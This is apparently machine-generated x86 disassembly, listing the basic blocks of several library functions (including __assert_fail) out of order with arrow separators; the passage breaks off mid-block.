0xb02417d:	movzx	eax, word ptr [edx + 2]
0xb024181:	add	eax, dword ptr [esp + 0xc]
0xb024185:	cmp	byte ptr [eax], 0
0xb024188:	je	0xb0241e2
None
|
|
|
v
0xb023fd6:	mov	eax, dword ptr [esp + 0x38]
0xb023fda:	lea	eax, dword ptr [eax + eax*2 + 3]
0xb023fde:	lea	ecx, dword ptr [eax*4]
0xb023fe5:	movzx	eax, word ptr [edi + 0xa]
0xb023fe9:	add	eax, ecx
0xb023feb:	cmp	eax, dword ptr [ebx + 0xfbc]
0xb023ff1:	jbe	0xb024008
None
|
|
|
v
0xb023f90:	push	ebp
0xb023f91:	push	edi
0xb023f92:	push	esi
0xb023f93:	mov	esi, 2
0xb023f98:	push	ebx
0xb023f99:	call	0xb1267db
None
|
|
|
v
0xb024374:	mov	edx, dword ptr [esp + 0x38]
0xb024378:	test	edx, edx
0xb02437a:	jne	0xb024094
None
|
|
|
v
0xb0240a3:	mov	ecx, dword ptr [esp + 0x3c]
0xb0240a7:	test	ecx, ecx
0xb0240a9:	jne	0xb0241be
None
|
|
|
v
0xb02413a:	mov	eax, dword ptr [esp + 0x60]
0xb02413e:	mov	ecx, dword ptr [esp + 0x3c]
0xb024142:	add	dword ptr [eax], 1
0xb024145:	test	ecx, ecx
0xb024147:	je	0xb023ff8
None
|
|
|
v
0xb02420a:	jmp	0xb02413a
None
|
|
|
v
0xb024197:	test	eax, eax
0xb024199:	mov	edx, eax
0xb02419b:	jne	0xb02420f
None
|
|
|
v
0xb02432e:	test	eax, eax
0xb024330:	jne	0xb024364
None
|
|
|
v
0xb023ff3:	mov	esi, 1
0xb023ff8:	add	esp, 0x4c
0xb023ffb:	mov	eax, esi
0xb023ffd:	pop	ebx
0xb023ffe:	pop	esi
0xb023fff:	pop	edi
0xb024000:	pop	ebp
0xb024001:	ret	8
None
|
|
|
v
0xb0241cd:	jmp	0xb023ff3
None
|
|
|
v
0xb024239:	mov	dword ptr [esp], edi
0xb02423c:	mov	dword ptr [esp + 0xc], eax
0xb024240:	call	0xb017470
None
|
|
|
v
0xb024364:	mov	eax, dword ptr [esp + 0x28]
0xb024368:	mov	esi, dword ptr [esp + 0x2c]
0xb02436c:	mov	dword ptr [esp], eax
0xb02436f:	call	0xb017470
None
|
|
|
v
0xb024280:	lea	edi, dword ptr [ecx - 1]
0xb024283:	imul	edi, edi, 6
0xb024286:	movzx	edi, word ptr [eax + edi + 2]
0xb02428b:	cmp	dword ptr [esp + 0x18], edi
0xb02428f:	je	0xb02429a
None
|
|
|
v
0xb0240de:	mov	dword ptr [ebp], eax
0xb0240e1:	mov	eax, dword ptr [esp + 0x60]
0xb0240e5:	test	edx, edx
0xb0240e7:	mov	dword ptr [eax], 0
0xb0240ed:	je	0xb024145
None
|
|
|
v
0xb0240af:	test	edx, edx
0xb0240b1:	je	0xb023ff3
None
|
|
|
v
0xb024222:	mov	dword ptr [esp], edi
0xb024225:	mov	dword ptr [esp + 0xc], edx
0xb024229:	call	0xb017470
None
|
|
|
v
0xb0241e2:	mov	eax, dword ptr [esp + 0x1c]
0xb0241e6:	mov	edx, ecx
0xb0241e8:	movzx	eax, word ptr [eax + 4]
0xb0241ec:	add	eax, dword ptr [esp + 0xc]
0xb0241f0:	call	0xb01d210
None
|
|
|
v
0xb0241b4:	test	ecx, ecx
0xb0241b6:	je	0xb023ff3
None
|
|
|
v
0xb023f9e:	add	ebx, 0x187062
0xb023fa4:	sub	esp, 0x4c
0xb023fa7:	mov	edi, dword ptr [ebx + 0xfc0]
0xb023fad:	test	edi, edi
0xb023faf:	je	0xb023ff8
None
|
|
|
v
0xb024132:	test	eax, eax
0xb024134:	jne	0xb024239
None
|
|
|
v
0xb024017:	test	eax, eax
0xb024019:	mov	esi, eax
0xb02401b:	jne	0xb023ff3
None
|
|
|
v
0xb024266:	movzx	ecx, word ptr [edi + 0xc]
0xb02426a:	lea	eax, dword ptr [ecx + eax - 1]
0xb02426e:	add	eax, dword ptr [ebx + 0xfc0]
0xb024274:	movzx	ecx, word ptr [eax]
0xb024277:	test	cx, cx
0xb02427a:	je	0xb024094
None
|
|
|
v
0xb024008:	mov	eax, esi
0xb02400a:	lea	edx, dword ptr [esp + 0x3c]
0xb02400e:	mov	dword ptr [esp + 0x14], ecx
0xb024012:	call	0xb023b10
None
|
|
|
v
0xb0241f7:	mov	eax, dword ptr [esp + 0x10]
0xb0241fb:	mov	edx, edi
0xb0241fd:	movzx	eax, word ptr [eax + 8]
0xb024201:	add	eax, dword ptr [esp + 0xc]
0xb024205:	call	0xb01d210
None
|
|
|
v
0xb02429a:	imul	edx, ecx, 0x3c
0xb02429d:	mov	dword ptr [esp + 0x14], eax
0xb0242a1:	mov	eax, dword ptr [esp + 0x60]
0xb0242a5:	mov	dword ptr [eax], ecx
0xb0242a7:	mov	dword ptr [esp], edx
0xb0242aa:	call	0xb0173f0
None
|
|
|
v
0xb02418a:	movzx	edx, word ptr [edx + 4]
0xb02418e:	add	edx, dword ptr [esp + 0xc]
0xb024192:	call	0xb023c00
None
|
|
|
v
0xb02425e:	or	esi, 0xffffffff
0xb024261:	jmp	0xb023ff8
None
|
|
|
v
0xb0241bc:	xor	edx, edx
0xb0241be:	mov	eax, dword ptr [esp + 0x1c]
0xb0241c2:	cmp	word ptr [eax + 8], 0
0xb0241c7:	jne	0xb0240b8
None
|
|
|
v
0xb023fd2:	test	eax, eax
0xb023fd4:	jne	0xb023ff3
None
|
|
|
v
0xb0240ef:	mov	edx, dword ptr [esp + 0x10]
0xb0240f3:	mov	ecx, dword ptr [esp + 0xc]
0xb0240f7:	movzx	eax, word ptr [edx]
0xb0240fa:	mov	dword ptr [edi + 8], 1
0xb024101:	mov	dword ptr [edi + 0x38], 0
0xb024108:	add	eax, ecx
0xb02410a:	mov	dword ptr [edi + 0xc], eax
0xb02410d:	lea	eax, dword ptr [ebx - 0x4af55]
0xb024113:	mov	dword ptr [edi + 0x10], eax
0xb024116:	movzx	eax, word ptr [edx + 6]
0xb02411a:	add	eax, ecx
0xb02411c:	cmp	byte ptr [eax], 0
0xb02411f:	je	0xb0241f7
None
|
|
|
v
0xb024353:	movzx	eax, word ptr [esi + 6]
0xb024357:	mov	edx, edi
0xb024359:	add	eax, dword ptr [esp + 0xc]
0xb02435d:	call	0xb01d210
None
|
|
|
v
0xb02421e:	mov	edx, dword ptr [esp + 0xc]
0xb024222:	mov	dword ptr [esp], edi
0xb024225:	mov	dword ptr [esp + 0xc], edx
0xb024229:	call	0xb017470
None
|
|
|
v
0xb02431f:	movzx	edx, word ptr [esi + 6]
0xb024323:	mov	ecx, edi
0xb024325:	add	edx, dword ptr [esp + 0xc]
0xb024329:	call	0xb023c00
None
|
|
|
v
0xb023ff8:	add	esp, 0x4c
0xb023ffb:	mov	eax, esi
0xb023ffd:	pop	ebx
0xb023ffe:	pop	esi
0xb023fff:	pop	edi
0xb024000:	pop	ebp
0xb024001:	ret	8
None
|
|
|
v
0xb024250:	mov	eax, dword ptr [esp + 0x18]
0xb024254:	cmp	eax, dword ptr [esp + 0x38]
0xb024258:	jne	0xb02405c
None
|
|
|
v
0xb02403a:	movzx	edx, word ptr [esp + 0x10]
0xb02403f:	mov	ecx, dword ptr [esp + 0x14]
0xb024043:	add	edx, edi
0xb024045:	test	byte ptr [esp + 0x64], 1
0xb02404a:	lea	eax, dword ptr [edx + eax - 0xc]
0xb02404e:	mov	dword ptr [esp + 0x20], edx
0xb024052:	mov	dword ptr [esp + 0x1c], eax
0xb024056:	jne	0xb024250
None
|
|
|
v
0xb0242af:	test	eax, eax
0xb0242b1:	mov	dword ptr [esp + 0x28], eax
0xb0242b5:	mov	dword ptr [ebp], eax
0xb0242b8:	je	0xb0241d8
None
|
|
|
v
0xb024145:	test	ecx, ecx
0xb024147:	je	0xb023ff8
None
|
|
|
v
0xb024291:	imul	ecx, ecx, 6
0xb024294:	lea	eax, dword ptr [eax + ecx + 2]
0xb024298:	jmp	0xb024274
None
|
|
|
v
0xb0241be:	mov	eax, dword ptr [esp + 0x1c]
0xb0241c2:	cmp	word ptr [eax + 8], 0
0xb0241c7:	jne	0xb0240b8
None
|
|
|
v
0xb02401d:	mov	eax, dword ptr [esp + 0x3c]
0xb024021:	movzx	edx, word ptr [edi + 0xa]
0xb024025:	mov	dword ptr [esp + 0x18], eax
0xb024029:	lea	eax, dword ptr [eax + eax*2 + 3]
0xb02402d:	shl	eax, 2
0xb024030:	add	edx, eax
0xb024032:	cmp	edx, dword ptr [ebx + 0xfbc]
0xb024038:	ja	0xb023ff3
None
|
|
|
v
0xb02420f:	test	ebp, ebp
0xb024211:	je	0xb024222
None
|
|
|
v
0xb024332:	mov	eax, dword ptr [esp + 0x14]
0xb024336:	add	edi, 0x3c
0xb024339:	add	esi, 6
0xb02433c:	add	dword ptr [esp + 0x24], 1
0xb024341:	movzx	eax, word ptr [eax]
0xb024344:	cmp	dword ptr [esp + 0x24], eax
0xb024348:	jl	0xb0242e3
None
|
|
|
v
0xb024087:	movzx	eax, word ptr [eax + 0xa]
0xb02408b:	test	ax, ax
0xb02408e:	jne	0xb024266
None
|
|
|
v
0xb0241f5:	jmp	0xb02419d
None
|
|
|
v
0xb02405c:	movzx	eax, word ptr [esp + 0xc]
0xb024061:	mov	edx, dword ptr [esp + 0x38]
0xb024065:	add	eax, edi
0xb024067:	mov	dword ptr [esp + 0xc], eax
0xb02406b:	mov	eax, dword ptr [esp + 0x20]
0xb02406f:	test	edx, edx
0xb024071:	lea	eax, dword ptr [eax + ecx - 0xc]
0xb024075:	mov	dword ptr [esp + 0x10], eax
0xb024079:	je	0xb0241b0
None
|
|
|
v
0xb0242be:	mov	eax, dword ptr [esp + 0x10]
0xb0242c2:	mov	edi, dword ptr [esp + 0x28]
0xb0242c6:	mov	dword ptr [esp + 0x2c], esi
0xb0242ca:	mov	dword ptr [esp + 0x24], 0
0xb0242d2:	movzx	eax, word ptr [eax]
0xb0242d5:	add	eax, dword ptr [esp + 0xc]
0xb0242d9:	mov	dword ptr [esp + 0x18], eax
0xb0242dd:	mov	eax, dword ptr [esp + 0x14]
0xb0242e1:	mov	esi, eax
0xb0242e3:	mov	eax, dword ptr [esp + 0x18]
0xb0242e7:	mov	edx, dword ptr [esp + 0x20]
0xb0242eb:	mov	dword ptr [edi + 0xc], eax
0xb0242ee:	movzx	eax, word ptr [esi + 2]
0xb0242f2:	imul	eax, eax, 0xc
0xb0242f5:	movzx	eax, word ptr [edx + eax]
0xb0242f9:	mov	edx, dword ptr [esp + 0xc]
0xb0242fd:	mov	dword ptr [edi + 8], 1
0xb024304:	mov	dword ptr [edi + 0x38], 0
0xb02430b:	add	eax, edx
0xb02430d:	mov	dword ptr [edi + 0x10], eax
0xb024310:	mov	dword ptr [esp + 0x18], eax
0xb024314:	movzx	eax, word ptr [esi + 4]
0xb024318:	add	eax, edx
0xb02431a:	cmp	byte ptr [eax], 0
0xb02431d:	je	0xb024353
None
|
|
|
v
0xb024213:	mov	dword ptr [esp + 0xc], eax
0xb024217:	mov	eax, edi
0xb024219:	call	0xb01b6a0
None
|
|
|
v
0xb0240b7:	nop	
None
|
|
|
v
0xb024380:	mov	ecx, dword ptr [esp + 0x3c]
0xb024384:	jmp	0xb0241b4
None
|
|
|
v
0xb024094:	mov	eax, dword ptr [esp + 0x10]
0xb024098:	cmp	word ptr [eax + 4], 0
0xb02409d:	je	0xb023ff3
None
|
|
|
v
0xb0241b0:	mov	ecx, dword ptr [esp + 0x18]
0xb0241b4:	test	ecx, ecx
0xb0241b6:	je	0xb023ff3
None
|
|
|
v
0xb0241d8:	mov	esi, 3
0xb0241dd:	jmp	0xb023ff8
None
|
|
|
v
0xb02434a:	mov	esi, dword ptr [esp + 0x2c]
0xb02434e:	jmp	0xb023ff8
None
|
|
|
v
0xb0240b8:	mov	dword ptr [esp], 0x78
0xb0240bf:	mov	dword ptr [esp + 0x18], ecx
0xb0240c3:	mov	dword ptr [esp + 0x14], edx
0xb0240c7:	call	0xb0173f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b024390
TOTAL BLOCKS :4
0xb024396:	add	ebx, 0x186c6a
0xb02439c:	sub	esp, 0x18
0xb02439f:	mov	edx, dword ptr [ebx + 0xfc0]
0xb0243a5:	test	edx, edx
0xb0243a7:	je	0xb0243b1
None
|
|
|
v
0xb024390:	push	ebx
0xb024391:	call	0xb1267db
None
|
|
|
v
0xb0243a9:	mov	dword ptr [esp], eax
0xb0243ac:	call	0xb017470
None
|
|
|
v
0xb0243b1:	add	esp, 0x18
0xb0243b4:	pop	ebx
0xb0243b5:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0244a0
TOTAL BLOCKS :3
0xb0244a0:	push	ebx
0xb0244a1:	call	0xb1267db
None
|
|
|
v
0xb0244a6:	add	ebx, 0x186b5a
0xb0244ac:	sub	esp, 0x18
0xb0244af:	mov	dword ptr [ebx + 0xfc4], eax
0xb0244b5:	lea	eax, dword ptr [ebx - 0x186c10]
0xb0244bb:	mov	dword ptr [esp + 4], eax
0xb0244bf:	mov	eax, dword ptr [ebx + 0xfc8]
0xb0244c5:	mov	dword ptr [esp], eax
0xb0244c8:	call	0xb0e8380
None
|
|
|
v
0xb0244cd:	add	esp, 0x18
0xb0244d0:	pop	ebx
0xb0244d1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0244e0
TOTAL BLOCKS :34
0xb02456e:	test	eax, eax
0xb024570:	mov	dword ptr [esi + 0xc], eax
0xb024573:	je	0xb0246b4
None
|
|
|
v
0xb0246a8:	add	esp, 0x2c
0xb0246ab:	xor	esi, esi
0xb0246ad:	pop	ebx
0xb0246ae:	mov	eax, esi
0xb0246b0:	pop	esi
0xb0246b1:	pop	edi
0xb0246b2:	pop	ebp
0xb0246b3:	ret	
None
|
|
|
v
0xb024534:	mov	ecx, dword ptr [esi + 8]
0xb024537:	test	ecx, ecx
0xb024539:	jne	0xb0246c2
None
|
|
|
v
0xb0245d4:	xor	eax, dword ptr gs:[0x18]
0xb0245db:	rol	eax, 9
0xb0245de:	mov	dword ptr [esi + 0x14], eax
0xb0245e1:	mov	dword ptr [esi + 4], 1
0xb0245e8:	add	esp, 0x2c
0xb0245eb:	mov	eax, esi
0xb0245ed:	pop	ebx
0xb0245ee:	pop	esi
0xb0245ef:	pop	edi
0xb0245f0:	pop	ebp
0xb0245f1:	ret	
None
|
|
|
v
0xb0246bd:	jmp	0xb02460f
None
|
|
|
v
0xb0244e9:	add	ebx, 0x186b17
0xb0244ef:	sub	esp, 0x2c
0xb0244f2:	mov	dword ptr [esp + 0x1c], eax
0xb0244f6:	lea	eax, dword ptr [esp + 0x1c]
0xb0244fa:	mov	dword ptr [esp], eax
0xb0244fd:	lea	ebp, dword ptr [ebx - 0x186c40]
0xb024503:	lea	edi, dword ptr [ebx + 0xfc8]
0xb024509:	mov	dword ptr [esp + 8], ebp
0xb02450d:	mov	dword ptr [esp + 4], edi
0xb024511:	call	0xb0e7ee0
None
|
|
|
v
0xb02469f:	mov	dword ptr [esp], edx
0xb0246a2:	call	0xb017470
None
|
|
|
v
0xb02453f:	mov	dword ptr [esp + 4], 0x80000001
0xb024547:	mov	eax, dword ptr [esi]
0xb024549:	mov	dword ptr [esp], eax
0xb02454c:	call	0xb123ae0
None
|
|
|
v
0xb02466b:	mov	edx, dword ptr [esp + 0x18]
0xb02466f:	mov	dword ptr [edx + 4], 0xfffffffd
0xb024676:	mov	dword ptr [edx + 8], 0
0xb02467d:	mov	dword ptr [edx], eax
0xb02467f:	mov	dword ptr [esp], edx
0xb024682:	mov	dword ptr [esp + 8], ebp
0xb024686:	mov	dword ptr [esp + 4], edi
0xb02468a:	mov	dword ptr [esp + 0x10], edx
0xb02468e:	call	0xb0e7d80
None
|
|
|
v
0xb024528:	mov	eax, dword ptr [esi + 4]
0xb02452b:	cmp	eax, 0xfe
0xb02452e:	jge	0xb0245f8
None
|
|
|
v
0xb024641:	test	eax, eax
0xb024643:	mov	edx, eax
0xb024645:	mov	esi, eax
0xb024647:	je	0xb0246a8
None
|
|
|
v
0xb024620:	mov	eax, dword ptr [esp + 0x1c]
0xb024624:	mov	dword ptr [esp], eax
0xb024627:	mov	dword ptr [esp + 0x10], eax
0xb02462b:	call	0xb07ae80
None
|
|
|
v
0xb024579:	lea	eax, dword ptr [ebx - 0x4acf8]
0xb02457f:	mov	dword ptr [esp + 4], eax
0xb024583:	mov	eax, dword ptr [esi + 8]
0xb024586:	mov	dword ptr [esp], eax
0xb024589:	call	0xb123b40
None
|
|
|
v
0xb024630:	mov	ecx, eax
0xb024632:	lea	eax, dword ptr [eax + 0x19]
0xb024635:	mov	dword ptr [esp], eax
0xb024638:	mov	dword ptr [esp + 0x14], ecx
0xb02463c:	call	0xb0173f0
None
|
|
|
v
0xb02455c:	lea	edx, dword ptr [ebx - 0x4b086]
0xb024562:	mov	dword ptr [esp + 4], edx
0xb024566:	mov	dword ptr [esp], eax
0xb024569:	call	0xb123b40
None
|
|
|
v
0xb0245f8:	mov	edx, dword ptr [esi + 8]
0xb0245fb:	test	edx, edx
0xb0245fd:	je	0xb02460f
None
|
|
|
v
0xb0245c0:	xor	eax, dword ptr gs:[0x18]
0xb0245c7:	rol	eax, 9
0xb0245ca:	mov	dword ptr [esi + 0x10], eax
0xb0245cd:	mov	eax, dword ptr [esi + 0x14]
0xb0245d0:	test	eax, eax
0xb0245d2:	je	0xb0245e1
None
|
|
|
v
0xb024649:	mov	ecx, dword ptr [esp + 0x14]
0xb02464d:	lea	eax, dword ptr [eax + 0x18]
0xb024650:	mov	dword ptr [esp], eax
0xb024653:	mov	dword ptr [esp + 0x18], edx
0xb024657:	add	ecx, 1
0xb02465a:	mov	dword ptr [esp + 8], ecx
0xb02465e:	mov	ecx, dword ptr [esp + 0x10]
0xb024662:	mov	dword ptr [esp + 4], ecx
0xb024666:	call	0xb07d0b0
None
|
|
|
v
0xb02458e:	mov	dword ptr [esi + 0x10], eax
0xb024591:	lea	eax, dword ptr [ebx - 0x4aced]
0xb024597:	mov	dword ptr [esp + 4], eax
0xb02459b:	mov	eax, dword ptr [esi + 8]
0xb02459e:	mov	dword ptr [esp], eax
0xb0245a1:	call	0xb123b40
None
|
|
|
v
0xb02460f:	add	esp, 0x2c
0xb024612:	mov	eax, esi
0xb024614:	pop	ebx
0xb024615:	pop	esi
0xb024616:	pop	edi
0xb024617:	pop	ebp
0xb024618:	ret	
None
|
|
|
v
0xb02451e:	mov	esi, dword ptr [eax]
0xb024520:	test	esi, esi
0xb024522:	je	0xb0246a8
None
|
|
|
v
0xb0246b4:	mov	eax, esi
0xb0246b6:	xor	esi, esi
0xb0246b8:	call	0xb0244a0
None
|
|
|
v
0xb0244e0:	push	ebp
0xb0244e1:	push	edi
0xb0244e2:	push	esi
0xb0244e3:	push	ebx
0xb0244e4:	call	0xb1267db
None
|
|
|
v
0xb0246a7:	nop	
None
|
|
|
v
0xb0246f5:	add	ecx, 0x18690b
0xb0246fb:	mov	edx, dword ptr gs:[0]
0xb024702:	mov	eax, dword ptr [ecx - 0x134]
0xb024708:	mov	eax, dword ptr [edx + eax]
0xb02470b:	mov	eax, dword ptr [eax]
0xb02470d:	mov	eax, dword ptr [eax + 0x58]
0xb024710:	ret	
None
|
|
|
v
0xb024551:	test	eax, eax
0xb024553:	mov	dword ptr [esi + 8], eax
0xb024556:	je	0xb0246a8
None
|
|
|
v
0xb0245e1:	mov	dword ptr [esi + 4], 1
0xb0245e8:	add	esp, 0x2c
0xb0245eb:	mov	eax, esi
0xb0245ed:	pop	ebx
0xb0245ee:	pop	esi
0xb0245ef:	pop	edi
0xb0245f0:	pop	ebp
0xb0245f1:	ret	
None
|
|
|
v
0xb0245ff:	lea	edx, dword ptr [eax + 1]
0xb024602:	test	eax, eax
0xb024604:	mov	eax, 1
0xb024609:	cmovg	eax, edx
0xb02460c:	mov	dword ptr [esi + 4], eax
0xb02460f:	add	esp, 0x2c
0xb024612:	mov	eax, esi
0xb024614:	pop	ebx
0xb024615:	pop	esi
0xb024616:	pop	edi
0xb024617:	pop	ebp
0xb024618:	ret	
None
|
|
|
v
0xb0246c2:	lea	eax, dword ptr [ebx - 0x4acd2]
0xb0246c8:	mov	dword ptr [esp + 0xc], eax
0xb0246cc:	lea	eax, dword ptr [ebx - 0x4ad31]
0xb0246d2:	mov	dword ptr [esp + 4], eax
0xb0246d6:	lea	eax, dword ptr [ebx - 0x4ad15]
0xb0246dc:	mov	dword ptr [esp + 8], 0x73
0xb0246e4:	mov	dword ptr [esp], eax
0xb0246e7:	call	0xb027820
None
|
|
|
v
0xb0245cd:	mov	eax, dword ptr [esi + 0x14]
0xb0245d0:	test	eax, eax
0xb0245d2:	je	0xb0245e1
None
|
|
|
v
0xb024693:	mov	edx, dword ptr [esp + 0x10]
0xb024697:	test	eax, eax
0xb024699:	jne	0xb024528
None
|
|
|
v
0xb024516:	test	eax, eax
0xb024518:	je	0xb024620
None
|
|
|
v
0xb0245a6:	mov	dword ptr [esi + 0x14], eax
0xb0245a9:	mov	eax, dword ptr [esi + 0xc]
0xb0245ac:	xor	eax, dword ptr gs:[0x18]
0xb0245b3:	rol	eax, 9
0xb0245b6:	mov	dword ptr [esi + 0xc], eax
0xb0245b9:	mov	eax, dword ptr [esi + 0x10]
0xb0245bc:	test	eax, eax
0xb0245be:	je	0xb0245cd
None
|
|
|
v
0xb0246ec:	nop	
0xb0246ee:	nop	
0xb0246f0:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b027640
TOTAL BLOCKS :2
0xb027645:	add	ecx, 0x1839bb
0xb02764b:	mov	edx, dword ptr gs:[0]
0xb027652:	mov	eax, dword ptr [ecx - 0x134]
0xb027658:	mov	eax, dword ptr [edx + eax]
0xb02765b:	mov	edx, dword ptr [esp + 4]
0xb02765f:	mov	eax, dword ptr [eax + edx*4 + 0x40]
0xb027663:	ret	
None
|
|
|
v
0xb027640:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b027670
TOTAL BLOCKS :21
0xb0277a8:	mov	edx, dword ptr [eax]
0xb0277aa:	mov	dword ptr [esp], eax
0xb0277ad:	mov	dword ptr [esp + 4], edx
0xb0277b1:	call	0xb0e7410
None
|
|
|
v
0xb027783:	mov	eax, dword ptr [esp + 0x3c]
0xb027787:	mov	dword ptr [esi], eax
0xb027789:	mov	eax, dword ptr [esp + 0x38]
0xb02778d:	mov	dword ptr [esp + 4], eax
0xb027791:	lea	eax, dword ptr [esi + 4]
0xb027794:	mov	dword ptr [esp], eax
0xb027797:	call	0xb07a810
None
|
|
|
v
0xb0276ff:	test	eax, eax
0xb027701:	js	0xb0277ed
None
|
|
|
v
0xb027678:	add	ebx, 0x183988
0xb02767e:	sub	esp, 0x40
0xb027681:	mov	eax, dword ptr [ebx + 0x38d8]
0xb027687:	test	eax, eax
0xb027689:	jne	0xb0277c7
None
|
|
|
v
0xb027725:	mov	eax, dword ptr [ebx - 0x144]
0xb02772b:	mov	eax, dword ptr [eax]
0xb02772d:	mov	dword ptr [esp], eax
0xb027730:	call	0xb063990
None
|
|
|
v
0xb0277c7:	mov	eax, dword ptr [ebx + 0x3890]
0xb0277cd:	mov	dword ptr [esp + 4], 0
0xb0277d5:	ror	eax, 9
0xb0277d8:	xor	eax, dword ptr gs:[0x18]
0xb0277df:	mov	dword ptr [esp], 1
0xb0277e6:	call	eax
None
|
|
|
v
0xb0277e8:	jmp	0xb02768f
None
|
|
|
v
0xb02780b:	jmp	0xb0277c2
None
|
|
|
v
0xb027670:	push	edi
0xb027671:	push	esi
0xb027672:	push	ebx
0xb027673:	call	0xb1267db
None
|
|
|
v
0xb02779c:	mov	eax, esi
0xb02779e:	xchg	dword ptr [ebx + 0x11a4], eax
None
|
|
|
v
0xb02779e:	xchg	dword ptr [ebx + 0x11a4], eax
None
|
|
|
v
0xb027707:	mov	eax, dword ptr [esp + 0x38]
0xb02770b:	mov	dword ptr [esp], 0
0xb027712:	mov	dword ptr [esp + 8], eax
0xb027716:	lea	eax, dword ptr [ebx - 0x47d3b]
0xb02771c:	mov	dword ptr [esp + 4], eax
0xb027720:	call	0xb062c40
None
|
|
|
v
0xb02768f:	mov	eax, dword ptr [esp + 0x60]
0xb027693:	lea	ecx, dword ptr [ebx - 0x4a773]
0xb027699:	test	eax, eax
0xb02769b:	je	0xb02780d
None
|
|
|
v
0xb0277b6:	mov	eax, dword ptr [esp + 0x38]
0xb0277ba:	mov	dword ptr [esp], eax
0xb0277bd:	call	0xb017470
None
|
|
|
v
0xb0277ed:	lea	eax, dword ptr [ebx - 0x4a9b0]
0xb0277f3:	mov	dword ptr [esp + 8], 0x12
0xb0277fb:	mov	dword ptr [esp + 4], eax
0xb0277ff:	mov	dword ptr [esp], 2
0xb027806:	call	0xb0dafe0
None
|
|
|
v
0xb0277a4:	test	eax, eax
0xb0277a6:	je	0xb0277b6
None
|
|
|
v
0xb0277c2:	call	0xb031970
None
|
|
|
v
0xb027735:	mov	eax, dword ptr [ebx - 0xe0]
0xb02773b:	mov	edx, dword ptr [esp + 0x3c]
0xb02773f:	mov	dword ptr [esp + 0x14], 0
0xb027747:	mov	dword ptr [esp + 0x10], 0xffffffff
0xb02774f:	mov	eax, dword ptr [eax + 0x10]
0xb027752:	mov	dword ptr [esp + 0xc], 0x22
0xb02775a:	mov	dword ptr [esp + 8], 3
0xb027762:	mov	dword ptr [esp], 0
0xb027769:	add	edx, eax
0xb02776b:	neg	eax
0xb02776d:	and	eax, edx
0xb02776f:	mov	dword ptr [esp + 4], eax
0xb027773:	mov	dword ptr [esp + 0x3c], eax
0xb027777:	call	0xb0e7320
None
|
|
|
v
0xb0276a1:	mov	edx, dword ptr [ebx - 0x118]
0xb0276a7:	lea	edi, dword ptr [ebx - 0x4aa73]
0xb0276ad:	lea	esi, dword ptr [ebx - 0x4a773]
0xb0276b3:	mov	edx, dword ptr [edx]
0xb0276b5:	cmp	byte ptr [edx], 0
0xb0276b8:	mov	dword ptr [esp + 0x18], eax
0xb0276bc:	mov	eax, dword ptr [esp + 0x5c]
0xb0276c0:	mov	dword ptr [esp + 0x1c], ecx
0xb0276c4:	cmove	esi, edi
0xb0276c7:	lea	edi, dword ptr [esp + 0x3c]
0xb0276cb:	mov	dword ptr [esp + 0x14], eax
0xb0276cf:	mov	eax, dword ptr [esp + 0x58]
0xb0276d3:	mov	dword ptr [esp + 0x24], edi
0xb0276d7:	mov	edi, dword ptr [esp + 0x54]
0xb0276db:	mov	dword ptr [esp + 0xc], esi
0xb0276df:	mov	dword ptr [esp + 8], edx
0xb0276e3:	mov	dword ptr [esp + 0x10], eax
0xb0276e7:	mov	eax, dword ptr [esp + 0x50]
0xb0276eb:	mov	dword ptr [esp + 0x20], edi
0xb0276ef:	mov	dword ptr [esp + 4], eax
0xb0276f3:	lea	eax, dword ptr [esp + 0x38]
0xb0276f7:	mov	dword ptr [esp], eax
0xb0276fa:	call	0xb04d4c0
None
|
|
|
v
0xb02777c:	cmp	eax, 0xff
0xb02777f:	mov	esi, eax
0xb027781:	je	0xb0277b6
None
|
|
|
v
0xb02780d:	lea	ecx, dword ptr [ebx - 0x4aa73]
0xb027813:	mov	eax, ecx
0xb027815:	jmp	0xb0276a1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__assert_fail
TOTAL BLOCKS :10
0xb0278d4:	mov	edx, dword ptr [esp + 0x43c]
0xb0278db:	mov	dword ptr [esp + 4], esi
0xb0278df:	mov	dword ptr [esp + 0x10], edx
0xb0278e3:	mov	edx, dword ptr [esp + 0x438]
0xb0278ea:	mov	dword ptr [esp], eax
0xb0278ed:	mov	dword ptr [esp + 0xc], edx
0xb0278f1:	mov	edx, dword ptr [esp + 0x434]
0xb0278f8:	mov	dword ptr [esp + 8], edx
0xb0278fc:	call	0xb027670
None
|
|
|
v
0xb027826:	add	ebx, 0x1837da
0xb02782c:	sub	esp, 0x28
0xb02782f:	mov	dword ptr [esp + 8], 5
0xb027837:	lea	eax, dword ptr [ebx - 0x4620c]
0xb02783d:	mov	dword ptr [esp + 4], eax
0xb027841:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb027847:	mov	dword ptr [esp], eax
0xb02784a:	call	0xb028340
None
|
|
|
v
0xb027901:	nop	
0xb027903:	nop	
0xb027905:	nop	
0xb027907:	nop	
0xb027909:	nop	
0xb02790b:	nop	
0xb02790d:	nop	
0xb02790f:	nop	
0xb027910:	sub	esp, 0x1c
0xb027913:	mov	eax, dword ptr [esp + 0x28]
0xb027917:	mov	dword ptr [esp + 0xc], 0
0xb02791f:	mov	dword ptr [esp + 8], eax
0xb027923:	mov	eax, dword ptr [esp + 0x24]
0xb027927:	mov	dword ptr [esp + 4], eax
0xb02792b:	mov	eax, dword ptr [esp + 0x20]
0xb02792f:	mov	dword ptr [esp], eax
0xb027932:	call	0xb027820
None
|
|
|
v
0xb027945:	add	ecx, 0x1836bb
0xb02794b:	mov	edx, dword ptr gs:[0]
0xb027952:	mov	eax, dword ptr [ecx - 0x110]
0xb027958:	mov	eax, dword ptr [edx + eax]
0xb02795b:	mov	edx, dword ptr [esp + 4]
0xb02795f:	movzx	eax, word ptr [eax + edx*2]
0xb027963:	and	eax, 8
0xb027966:	movzx	eax, ax
0xb027969:	ret	
None
|
|
|
v
0xb0278b2:	mov	dword ptr [esp + 8], 5
0xb0278ba:	mov	esi, eax
0xb0278bc:	lea	eax, dword ptr [ebx - 0x461e0]
